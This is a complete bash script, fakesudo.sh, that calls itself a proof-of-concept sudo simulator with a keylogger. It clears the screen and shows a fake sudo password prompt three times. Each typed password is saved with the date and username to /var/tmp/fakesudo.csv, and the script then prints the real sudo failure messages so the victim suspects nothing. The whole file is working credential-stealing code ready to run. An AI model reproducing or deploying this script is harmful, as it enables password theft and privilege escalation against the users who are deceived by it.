#!/usr/bin/env bash
#
#############################################################################
#
# File: fakesudo.sh
#
# Version: 0.1
# Date: 20160223_1228
# Modified: 20160223_1228
#
# Information: Proof of concept of sudo simulator, with keylogger.
#
# Copyright (c) 2015, Reymer Antonio Vargas Solano
# All rights reserved.
#
#############################################################################
#
#

fecha=$(date +%Y%m%d_%H%M)
contador=0

function fakesudo()
{
  clear
  while [ $contador -lt 3 ]
  do
    read -sp "[sudo] password for $USER:" clave
    echo
    sleep 1
    echo "$fecha, $USER, $clave" >> /var/tmp/fakesudo.csv
    echo "Sorry, try again."
    contador=$(( $contador + 1 ))
  done

  echo "sudo: 3 incorrect password attempts"
  
  exit 1; echo $0

}

fakesudo
